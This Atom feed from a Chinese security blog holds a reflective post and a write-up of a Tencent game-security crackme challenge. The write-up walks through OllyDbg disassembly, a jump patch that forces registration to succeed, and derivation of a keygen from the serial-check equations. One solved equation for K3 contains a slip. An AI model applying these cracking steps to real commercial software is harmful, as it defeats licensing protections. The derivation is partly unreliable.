<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>以梦为马</title>
  <subtitle>诗酒趁年华</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://venidic.com/"/>
  <updated>2017-04-15T16:51:40.474Z</updated>
  <id>http://venidic.com/</id>
  
  <author>
    <name>venidic</name>
    <email>venidic@qq.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>以梦为马，诗酒趁年华</title>
    <link href="http://venidic.com/2017/04/16/%E4%BB%A5%E6%A2%A6%E4%B8%BA%E9%A9%AC%EF%BC%8C%E8%AF%97%E9%85%92%E8%B6%81%E5%B9%B4%E5%8D%8E/"/>
    <id>http://venidic.com/2017/04/16/以梦为马，诗酒趁年华/</id>
    <published>2017-04-15T16:33:39.000Z</published>
    <updated>2017-04-15T16:51:40.474Z</updated>
    
    <content type="html"><![CDATA[<p>截止到今天，<a href="http://venidic.com">http://venidic.com</a> 已经有整整1个年头没有更新了，说来惭愧，原因主要在自己。大四下总想着多玩玩，而到了公司之后，也被各种业务拖着，一直没能静下心来好好写写博客。<br>先前的windows x64的学习，走马观花的看了一遍教程，简单的实现了几个demo后便在也没有跟进了，而《windows内核情景分析》也在艰难的看了上半本之后截止了自己的学习，如今，学习的知识全部还了回去。回顾这一年，自己在技术上的沉淀确实不多，很多都是现学现卖，够用就行。对于做安全这一行的，这其实是很不好的习惯。自己无法连接学的每一个知识点，形成自己的安全体系，我想这是作为安全工作者的一种失职。我想也是应该好好回想下自己的所见所学，查漏补缺，去丰富自己的知识体系了吧。<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/timg.jpg" class="full-image"><br><a id="more"></a><br>截止到今天，<a href="http://venidic.com">http://venidic.com</a> 已经有整整1个年头没有更新了，说来惭愧，原因主要在自己。大四下总想着多玩玩，而到了公司之后，也被各种业务拖着，一直没能静下心来好好写写博客。<br>先前的windows x64的学习，走马观花的看了一遍教程，简单的实现了几个demo后便在也没有跟进了，而《windows内核情景分析》也在艰难的看了上半本之后截止了自己的学习，如今，学习的知识全部还了回去。回顾这一年，自己在技术上的沉淀确实不多，很多都是现学现卖，够用就行。对于做安全这一行的，这其实是很不好的习惯。自己无法连接学的每一个知识点，形成自己的安全体系，我想这是作为安全工作者的一种失职。我想也是应该好好回想下自己的所见所学，查漏补缺，去丰富自己的知识体系了吧。</p>
<p>突然间想把个人博客重新捡起来，是因为最近的几件事情，一来是自己博客上公布的QQ号有好几个朋友添加一起讨论技术上的问题，问了下原因是从博客这边获得了QQ号，然后还有就是带的学弟，最近无意提到了自己的博客，感觉自己很是惭愧，没有能起到一个带头的作用。再来是最近督促自己的女朋友学习技术，想让她也学着搭建一个自己的博客，回想起了最初自己搭建博客的原因。</p>
<p>正如之前的文章所诉，自己写博客的目的：为了积淀，为了思考，为了坚持。我想哪怕就算是自己的工作再忙，也希望自己能够静下心来，做一下独立于工作之外的技术上的思考和积累。<br>网站的名字改了，我想关于年轻时的那份轻狂，现在自己最缺少的是 将最初梦想坚持下去的决心。所以借用了别人的诗句，希望自己能够在青春的尾巴上，追求自己的诗和远方！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;截止到今天，&lt;a href=&quot;http://venidic.com&quot;&gt;http://venidic.com&lt;/a&gt; 已经有整整1个年头没有更新了，说来惭愧，原因主要在自己。大四下总想着多玩玩，而到了公司之后，也被各种业务拖着，一直没能静下心来好好写写博客。&lt;br&gt;先前的windows x64的学习，走马观花的看了一遍教程，简单的实现了几个demo后便在也没有跟进了，而《windows内核情景分析》也在艰难的看了上半本之后截止了自己的学习，如今，学习的知识全部还了回去。回顾这一年，自己在技术上的沉淀确实不多，很多都是现学现卖，够用就行。对于做安全这一行的，这其实是很不好的习惯。自己无法连接学的每一个知识点，形成自己的安全体系，我想这是作为安全工作者的一种失职。我想也是应该好好回想下自己的所见所学，查漏补缺，去丰富自己的知识体系了吧。&lt;br&gt;&lt;img src=&quot;http://7xieyq.com1.z0.glb.clouddn.com/timg.jpg&quot; class=&quot;full-image&quot; /&gt;&lt;br&gt;
    
    </summary>
    
      <category term="呓语" scheme="http://venidic.com/categories/%E5%91%93%E8%AF%AD/"/>
    
    
      <category term="随笔" scheme="http://venidic.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全竞赛分析</title>
    <link href="http://venidic.com/2016/03/10/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%86%E6%9E%90/"/>
    <id>http://venidic.com/2016/03/10/腾讯游戏安全竞赛分析/</id>
    <published>2016-03-10T05:03:35.000Z</published>
    <updated>2017-04-15T15:40:37.778Z</updated>
    
    <content type="html"><![CDATA[<p>最近被告知部门举办了关于游戏安全的比赛，网址是<a href="http://gslab.qq.com/competition/index.shtml" title="游戏安全技术竞赛" target="_blank" rel="external">游戏安全技术竞赛</a>,看了下，奖励还算可以，就是不该全是QB，再加上这几天实在是冻的不行，宅在寝室就分析了下这个题。<br><a id="more"></a></p>
<h1 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h1><p>刚拿到程序，还是老套路PEID扫扫，然后就直接OD打开了，好在没有什么壳和反调，所以找到关键点也是比较容易的。<br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f1rr1046d6j20cz05b74h.jpg" alt=""><br>打开OD，查找字符串和GetDlgItemText都无果，于是进一步分析，发现在读取用户名和序列号都用到了GetDlgItem，然后调用了SendMessage，差不多应该可以知道是Get到每一个按钮的ID，然后获得对应的句柄，在调用SendMessage进行传递。<br>我们打开资源工具进行分析<br><img src="http://ww1.sinaimg.cn/large/dcfd67b5gw1f1rr1htgvuj20p20etgra.jpg" alt=""><br>结合OD分析<br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f1rr1pkrkcj20jz084zn1.jpg" alt=""><br>验证上述猜想。<br>我们接着分析得到字符串和注册码之后的流程，发现在运行过程中，将“失败”和“成功”这两个字符传入内存，这就是为什么查不到字符的原因：<br><img src="http://ww3.sinaimg.cn/large/dcfd67b5gw1f1rr1zg2hhj20da086acq.jpg" alt=""><br>继续往下分析，发现最后调用了GetDlgItem之后SendMessage，由此可以知道，是通过算法判断判定最后是否注册成功，然后取相应的“成功”或“失败”字串，拷贝到相应的ID为1005的静态控件上，进而通过Send显示出来<br>下图是运行前<br><img src="http://ww1.sinaimg.cn/large/dcfd67b5gw1f1rr2864ufj20ei029wf6.jpg" alt=""><br>出错后将“失败”拷贝到前面内存处<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f1rr2go097j20eq0220t4.jpg" alt=""><br>那么大体流程弄清楚后，patch就很好写了，修改跳转，修改寄存器，或者直接修改内存即可以爆破成功，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">013E21E7   &gt; \33C0          xor eax,eax                              ;  不能走这一步</div><div class="line">013E21E9   &gt;  8B5484 7D     mov edx,dword ptr ss:[esp+eax*4+0x7D]    ;  eax控制取成功还是失败，这里需要=1</div><div class="line">013E21ED   .  8B4C24 54     mov ecx,dword ptr ss:[esp+0x54]</div><div class="line">013E21F1   .  8D4424 74     lea eax,dword ptr ss:[esp+0x74]</div><div class="line">013E21F5   .  50            push eax</div><div class="line">013E21F6   .  53            push ebx</div><div class="line">013E21F7   .  6A 0C         push 0xC</div><div class="line">013E21F9   .  68 ED030000   push 0x3ED</div><div class="line">013E21FE   .  899424 880000&gt;mov dword ptr ss:[esp+0x88],edx</div><div class="line">013E2205   .  E8 52580000   call Tencent2.013E7A5C</div></pre></td></tr></table></figure></p>
<p>这里不再过多叙述：<br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f1rr2rc3vuj20d4058t8x.jpg" alt=""></p>
<h1 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h1><p>题目要求是写出算法注册机，那么patch肯定不行的。那我们开始分析算法：</p>
<p>##用户名部分<br>直接定位到用户名部分算法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">013E1FE2   .  99            cdq</div><div class="line">013E1FE3   .  F7FF          idiv edi</div><div class="line">013E1FE5   .  8DB40C 880000&gt;lea esi,dword ptr ss:[esp+ecx+0x88]</div><div class="line">013E1FEC   .  41            inc ecx</div><div class="line">013E1FED   .  0FBE8414 9C00&gt;movsx eax,byte ptr ss:[esp+edx+0x9C]     ;  遍历用户名，取ascii</div><div class="line">013E1FF5   .  8D142E        lea edx,dword ptr ds:[esi+ebp]</div><div class="line">013E1FF8   .  0FAFC2        imul eax,edx                             ;  edx = 20160126+次数</div><div class="line">013E1FFB   .  0FAFC7        imul eax,edi                             ;  eax = len_name*(name_asii*(20160126+次数))</div><div class="line">013E1FFE   .  0106          add dword ptr ds:[esi],eax</div><div class="line">013E2000   .  83F9 10       cmp ecx,0x10                             ;  循环次数</div></pre></td></tr></table></figure></p>
<p>其实可以看到用户名部分算法还是蛮简单的，将每一个用户名的字符取ASCII，然后x（ 用户名长度） ×（20160126+次数），最后通过取余，进行循环乘16次，最后累加到内存中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0025EF08  8C 1F 46 8B 21 5A 07 BB BA A8 B9 59 86 0E 64 26  ?F?Z缓üY?d&amp;</div><div class="line">0025EF18  AE 6F 52 00                                      畂R.v</div></pre></td></tr></table></figure></p>
<p>##序列号部分<br>其实这个题刚开始看的时候，觉得序列号部分的算法还是蛮复杂的。跟了很多函数，后来发现很多函数其实是编译器进行了安全优化。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">013E2053   &gt; /8A08          mov cl,byte ptr ds:[eax]                 ;  注册码长度遍历</div><div class="line">013E2055   . |40            inc eax</div><div class="line">013E2056   . |3ACB          cmp cl,bl</div><div class="line">013E2058   .^\75 F9         jnz XTencent2.013E2053</div><div class="line">013E205A   .  2BC2          sub eax,edx                              ;  得到注册码的长度</div><div class="line">013E205C   .  50            push eax                                 ;  key_len</div><div class="line">013E205D   .  8D9424 A40100&gt;lea edx,dword ptr ss:[esp+0x1A4]</div><div class="line">013E2064   .  52            push edx                                 ;  key_str</div><div class="line">013E2065   .  8D4C24 60     lea ecx,dword ptr ss:[esp+0x60]</div><div class="line">013E2069   .  E8 A2050000   call Tencent2.013E2610                   ;  key安全拷贝</div><div class="line">013E206E   .  8D4424 58     lea eax,dword ptr ss:[esp+0x58]          ;  key_str偏移-0x4</div><div class="line">013E2072   .  50            push eax</div><div class="line">013E2073   .  8D4424 18     lea eax,dword ptr ss:[esp+0x18]</div><div class="line">013E2077   .  C68424 B40200&gt;mov byte ptr ss:[esp+0x2B4],0x2</div><div class="line">013E207F   .  E8 DCF8FFFF   call Tencent2.013E1960                   ;  关键call</div></pre></td></tr></table></figure></p>
<p>像这里的<strong>Tencent2.013E2610</strong>函数，便是优化后的安全的<strong>memcpy</strong>，只不过做了蛮多的校验和检测。<strong>Tencent2.013E1960</strong>是一个重要的函数，我们着重的分析下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">013E19AA  |&gt; \8B5424 28     mov edx,dword ptr ss:[esp+0x28]          ;  this</div><div class="line">013E19AE  |.  8B06          mov eax,dword ptr ds:[esi]</div><div class="line">013E19B0  |.  53            push ebx</div><div class="line">013E19B1  |.  52            push edx</div><div class="line">013E19B2  |.  51            push ecx</div><div class="line">013E19B3  |.  50            push eax</div><div class="line">013E19B4  |.  8D5C24 38     lea ebx,dword ptr ss:[esp+0x38]</div><div class="line">013E19B8  |.  E8 A30B0000   call Tencent2.013E2560                   ;  memmove_s(逆向发现什么都没move)</div><div class="line">013E19BD  |.  837C24 24 00  cmp dword ptr ss:[esp+0x24],0x0          ;  key_len != 0</div><div class="line">013E19C2  |.  0F84 3C020000 je Tencent2.013E1C04</div><div class="line">013E19C8  |&gt;  8B4424 1C     /mov eax,dword ptr ss:[esp+0x1C]</div><div class="line">013E19CC  |.  FF4C24 24     |dec dword ptr ss:[esp+0x24]             ;  key_len--</div><div class="line">013E19D0  |.  3B47 14       |cmp eax,dword ptr ds:[edi+0x14]         ;  key_len大于0</div><div class="line">013E19D3  |.  76 05         |jbe XTencent2.013E19DA</div><div class="line">013E19D5  |.  E8 80F60000   |call Tencent2.013F105A</div><div class="line">013E19DA  |&gt;  837F 18 10    |cmp dword ptr ds:[edi+0x18],0x10</div><div class="line">013E19DE  |.  8D5F 04       |lea ebx,dword ptr ds:[edi+0x4]          ;  key_str</div><div class="line">013E19E1  |.  72 04         |jb XTencent2.013E19E7</div><div class="line">013E19E3  |.  8B03          |mov eax,dword ptr ds:[ebx]</div><div class="line">013E19E5  |.  EB 02         |jmp XTencent2.013E19E9</div><div class="line">013E19E7  |&gt;  8BC3          |mov eax,ebx                             ;  key_str</div><div class="line">013E19E9  |&gt;  8B4C24 1C     |mov ecx,dword ptr ss:[esp+0x1C]         ;  ecx应该为循环次数，从0开始累加</div><div class="line">013E19ED  |.  803C08 2A     |cmp byte ptr ds:[eax+ecx],0x2A          ;  注册码第一位如果为*，则break</div><div class="line">013E19F1  |.  0F84 33010000 |je Tencent2.013E1B2A</div><div class="line">013E19F7  |.  3B4F 14       |cmp ecx,dword ptr ds:[edi+0x14]         ;  len与次数比较</div><div class="line">013E19FA  |.  76 09         |jbe XTencent2.013E1A05</div><div class="line">013E19FC  |.  E8 59F60000   |call Tencent2.013F105A</div><div class="line">013E1A01  |.  8B4C24 1C     |mov ecx,dword ptr ss:[esp+0x1C]</div><div class="line">013E1A05  |&gt;  837F 18 10    |cmp dword ptr ds:[edi+0x18],0x10</div><div class="line">013E1A09  |.  72 04         |jb XTencent2.013E1A0F</div><div class="line">013E1A0B  |.  8B03          |mov eax,dword ptr ds:[ebx]</div><div class="line">013E1A0D  |.  EB 02         |jmp XTencent2.013E1A11</div><div class="line">013E1A0F  |&gt;  8BC3          |mov eax,ebx                             ;  key_str</div><div class="line">013E1A11  |&gt;  8A0408        |mov al,byte ptr ds:[eax+ecx]            ;  key_str[ecx]</div><div class="line">013E1A14  |.  0FB6C8        |movzx ecx,al                            ;  取ascii</div><div class="line">013E1A17  |.  51            |push ecx</div><div class="line">013E1A18  |.  884424 14     |mov byte ptr ss:[esp+0x14],al</div><div class="line">013E1A1C  |.  E8 A5F70000   |call Tencent2.013F11C6                  ;  判断注册码是字母或者数字</div><div class="line">013E1A21  |.  83C4 04       |add esp,0x4</div><div class="line">013E1A24  |.  85C0          |test eax,eax</div><div class="line">013E1A26  |.  75 10         |jnz XTencent2.013E1A38</div><div class="line">013E1A28  |.  8A4424 10     |mov al,byte ptr ss:[esp+0x10]</div><div class="line">013E1A2C  |.  3C 40         |cmp al,0x40                             ;  判断是否为&apos;@&apos;</div><div class="line">013E1A2E  |.  74 08         |je XTencent2.013E1A38</div><div class="line">013E1A30  |.  3C 25         |cmp al,0x25                             ;  判断是否为&apos;%&apos;</div><div class="line">013E1A32  |.  0F85 F2000000 |jnz Tencent2.013E1B2A</div><div class="line">013E1A38  |&gt;  8B5424 1C     |mov edx,dword ptr ss:[esp+0x1C]</div><div class="line">013E1A3C  |.  3B57 14       |cmp edx,dword ptr ds:[edi+0x14]</div><div class="line">013E1A3F  |.  76 05         |jbe XTencent2.013E1A46</div><div class="line">013E1A41  |.  E8 14F60000   |call Tencent2.013F105A</div><div class="line">013E1A46  |&gt;  837F 18 10    |cmp dword ptr ds:[edi+0x18],0x10</div><div class="line">013E1A4A  |.  72 02         |jb XTencent2.013E1A4E</div><div class="line">013E1A4C  |.  8B1B          |mov ebx,dword ptr ds:[ebx]</div><div class="line">013E1A4E  |&gt;  8B4C24 1C     |mov ecx,dword ptr ss:[esp+0x1C]</div><div class="line">013E1A52  |.  8B4424 20     |mov eax,dword ptr ss:[esp+0x20]</div><div class="line">013E1A56  |.  8A140B        |mov dl,byte ptr ds:[ebx+ecx]            ;  key_str[ecx]</div><div class="line">013E1A59  |.  885404 18     |mov byte ptr ss:[esp+eax+0x18],dl       ;  存放回去</div><div class="line">013E1A5D  |.  40            |inc eax</div><div class="line">013E1A5E  |.  41            |inc ecx</div><div class="line">013E1A5F  |.  894424 20     |mov dword ptr ss:[esp+0x20],eax</div><div class="line">013E1A63  |.  894C24 1C     |mov dword ptr ss:[esp+0x1C],ecx</div><div class="line">013E1A67  |.  83F8 04       |cmp eax,0x4                             ;  4位一取？</div><div class="line">013E1A6A  |.  0F85 AF000000 |jnz Tencent2.013E1B1F</div><div class="line">013E1A70  |.  33FF          |xor edi,edi</div><div class="line">013E1A72  |&gt;  8A443C 18     |/mov al,byte ptr ss:[esp+edi+0x18]      ;  key_str[edi]，edi为偏移量</div><div class="line">013E1A76  |.  8D5C24 10     ||lea ebx,dword ptr ss:[esp+0x10]        ;  取地址</div><div class="line">013E1A7A  |.  884424 10     ||mov byte ptr ss:[esp+0x10],al          ;  取ascii</div><div class="line">013E1A7E  |.  E8 9D090000   ||call Tencent2.013E2420                 ;  取字符在数字字母字符串中的位置</div><div class="line">013E1A83  |.  88443C 18     ||mov byte ptr ss:[esp+edi+0x18],al</div><div class="line">013E1A87  |.  47            ||inc edi</div><div class="line">013E1A88  |.  83FF 04       ||cmp edi,0x4</div><div class="line">013E1A8B  |.^ 7C E5         |\jl XTencent2.013E1A72</div></pre></td></tr></table></figure></p>
<p>这一段很长，差不多先是检测了长度最小值，然后判断是否是字符数字和“@”和“%”<br>然后关键点是，取每一个序列号的ascii，会在一个字符串“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@%”<br>中找到自己的偏移，每4位一取，将偏移放入32位寄存器，我们将32位的寄存器分为4个字节，分别设为dcba，那么接下来就是<strong>序列号的计算过程</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">013E1A8D  |.  8B4C24 18     |mov ecx,dword ptr ss:[esp+0x18]         ;  4个字符分别在数字字母字符串中的位置</div><div class="line">013E1A91  |.  8AC1          |mov al,cl</div><div class="line">013E1A93  |.  02C0          |add al,al</div><div class="line">013E1A95  |.  8AD5          |mov dl,ch</div><div class="line">013E1A97  |.  C0EA 04       |shr dl,0x4</div><div class="line">013E1A9A  |.  80E2 03       |and dl,0x3</div><div class="line">013E1A9D  |.  02C0          |add al,al</div><div class="line">013E1A9F  |.  02D0          |add dl,al                               ;  4*a + ((b&gt;&gt;4)&amp;3)</div><div class="line">013E1AA1  |.  8A4424 1A     |mov al,byte ptr ss:[esp+0x1A]</div><div class="line">013E1AA5  |.  885424 14     |mov byte ptr ss:[esp+0x14],dl           ;  回存数据</div><div class="line">013E1AA9  |.  8AD0          |mov dl,al</div><div class="line">013E1AAB  |.  C0EA 02       |shr dl,0x2</div><div class="line">013E1AAE  |.  8ACD          |mov cl,ch</div><div class="line">013E1AB0  |.  C0E0 06       |shl al,0x6</div><div class="line">013E1AB3  |.  024424 1B     |add al,byte ptr ss:[esp+0x1B]           ;  d + ((c) &lt;&lt;6)</div><div class="line">013E1AB7  |.  80E2 0F       |and dl,0xF</div><div class="line">013E1ABA  |.  C0E1 04       |shl cl,0x4</div><div class="line">013E1ABD  |.  32D1          |xor dl,cl                               ;  (16*b)^((c&gt;&gt;2) &amp; 15)</div><div class="line">013E1ABF  |.  885424 15     |mov byte ptr ss:[esp+0x15],dl           ;  回存数据</div><div class="line">013E1AC3  |.  884424 16     |mov byte ptr ss:[esp+0x16],al           ;  回存数据</div><div class="line">013E1AC7  |.  33FF          |xor edi,edi</div></pre></td></tr></table></figure></p>
<p>所以这里将每4为序列号通过偏移后计算，生成3字节的数据存放于内存中</p>
<p>##用户名再运算<br>我们已经知道用户名通过乘和加存放在内存中，在最后比对前，又将刚刚计算好的数据做了一次运算，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">013E2102   &gt; /8B8C34 880000&gt;mov ecx,dword ptr ss:[esp+esi+0x88]      ;  最开始计算用户名生成的地方</div><div class="line">013E2109   . |B8 67666666   mov eax,0x66666667</div><div class="line">013E210E   . |F7E9          imul ecx</div><div class="line">013E2110   . |C1FA 02       sar edx,0x2</div><div class="line">013E2113   . |8BCA          mov ecx,edx</div><div class="line">013E2115   . |C1E9 1F       shr ecx,0x1F                             ;  /10</div><div class="line">013E2118   . |03CA          add ecx,edx</div><div class="line">013E211A   . |8B5424 24     mov edx,dword ptr ss:[esp+0x24]</div><div class="line">013E211E   . |2BD7          sub edx,edi</div><div class="line">013E2120   . |894C34 2C     mov dword ptr ss:[esp+esi+0x2C],ecx      ;  回存</div><div class="line">013E2124   .  3BF2          cmp esi,edx</div><div class="line">013E2126   .  72 09         jb XTencent2.013E2131</div><div class="line">013E2128   .  E8 2DEF0000   call Tencent2.013F105A</div><div class="line"></div><div class="line">013E212D   .  8B7C24 20     mov edi,dword ptr ss:[esp+0x20]</div><div class="line">013E2131   &gt;  8B043E        mov eax,dword ptr ds:[esi+edi]           ;  回存（edi赋值见上</div><div class="line">013E2134   .  894434 40     mov dword ptr ss:[esp+esi+0x40],eax</div><div class="line">013E2138   .  83C6 04       add esi,0x4</div><div class="line">013E213B   .  83FE 14       cmp esi,0x14</div></pre></td></tr></table></figure></p>
<p>这里运用了编译器对除法的优化，通过乘以MagicNumber后右移，来达到大数除法的优化。<br>这里将上述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0025EF08  8C 1F 46 8B 21 5A 07 BB BA A8 B9 59 86 0E 64 26  ?F?Z缓üY?d&amp;</div><div class="line">0025EF18  AE 6F 52 00                                      畂R.v</div></pre></td></tr></table></figure></p>
<p>运算后变换成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0025EEAC  F5 CF 53 F4 D1 55 1A F9 45 F7 F8 08 40 CE D6 03  跸S粞U鵈鼬@沃</div><div class="line">0025EEBC  5E 3E 08 00                                      ^&gt;.</div></pre></td></tr></table></figure></p>
<p>而紧接着又将刚刚算好的序列号拷贝到附近<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0025EEBC              CA BC C8 15 71 A7 E2 1A BB F5 C1 E1      始?qр货玲</div><div class="line">0025EECC  85 C5 CF 0C C6 25 6E ED                          吪??n泶?.</div></pre></td></tr></table></figure></p>
<p>##最后的比较<br>有了这两组数据，就可以开始比较了，这里为了方便描述，我们将用户名生成的描述成<br>U1(F5 CF 53 F4),U2( D1 55 1A F9), U3(45 F7 F8 08), U4(40 CE D6 03),U5(5E 3E 08 00 )<br>同理将序列号以4位一取，描述成K1，K2，K3，K4，K5<br>接下来就是比较的地方了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">013E2140   .  8B4C24 2C     mov ecx,dword ptr ss:[esp+0x2C]          ;  U1</div><div class="line">013E2144   .  8B4424 50     mov eax,dword ptr ss:[esp+0x50]          ;  K5</div><div class="line">013E2148   .  8D1408        lea edx,dword ptr ds:[eax+ecx]           ;  U1+K5</div><div class="line">013E214B   .  8B4C24 48     mov ecx,dword ptr ss:[esp+0x48]          ;  K3</div><div class="line">013E214F   .  3BD1          cmp edx,ecx                              ;  U1+K5 = K3</div><div class="line">013E2151   .  75 58         jnz XTencent2.013E21AB</div><div class="line">013E2153   .  8B5424 30     mov edx,dword ptr ss:[esp+0x30]          ;  U2</div><div class="line">013E2157   .  03D1          add edx,ecx                              ;  U2+K3</div><div class="line">013E2159   .  03C0          add eax,eax                              ;  K5*2</div><div class="line">013E215B   .  3BD0          cmp edx,eax                              ;  U2+K3 = K5*2</div><div class="line">013E215D   .  75 4C         jnz XTencent2.013E21AB</div><div class="line">013E215F   .  8B4C24 4C     mov ecx,dword ptr ss:[esp+0x4C]          ;  K4</div><div class="line">013E2163   .  8B4424 34     mov eax,dword ptr ss:[esp+0x34]          ;  U3</div><div class="line">013E2167   .  8B5424 40     mov edx,dword ptr ss:[esp+0x40]          ;  K1</div><div class="line">013E216B   .  8D3401        lea esi,dword ptr ds:[ecx+eax]           ;  K4+U3</div><div class="line">013E216E   .  3BF2          cmp esi,edx                              ;  K4+U3 = K1</div><div class="line">013E2170   .  75 39         jnz XTencent2.013E21AB</div><div class="line">013E2172   .  8B7424 38     mov esi,dword ptr ss:[esp+0x38]          ;  U4</div><div class="line">013E2176   .  03F2          add esi,edx                              ;  U4+K1</div><div class="line">013E2178   .  03C9          add ecx,ecx                              ;  K4*2</div><div class="line">013E217A   .  3BF1          cmp esi,ecx                              ;  U4+K1 = K4*2</div><div class="line">013E217C   .  75 2D         jnz XTencent2.013E21AB</div><div class="line">013E217E   .  8B5424 3C     mov edx,dword ptr ss:[esp+0x3C]          ;  U5</div><div class="line">013E2182   .  8B4C24 44     mov ecx,dword ptr ss:[esp+0x44]          ;  K2</div><div class="line">013E2186   .  03CA          add ecx,edx                              ;  U5+K2</div><div class="line">013E2188   .  8D1440        lea edx,dword ptr ds:[eax+eax*2]         ;  U3*3</div><div class="line">013E218B   .  3BCA          cmp ecx,edx                              ;  U5+K2 = U3*3</div></pre></td></tr></table></figure></p>
<p>列出方程：<br>U1+K5 = K3<br>U2+K3 = K5<em>2<br>K4+U3 = K1<br>U4+K1 = K4</em>2<br>U5+K2 = U3<em>3<br>因为我们一般知道用户名，需要求注册码，那么U为已知，解K<br>K1 = U3</em>2 + U4<br>K2 = U3<em>3 - U5<br>K3 = U1</em>2 + K5<br>K4 = U3 + U4<br>K5 = U1 + U2</p>
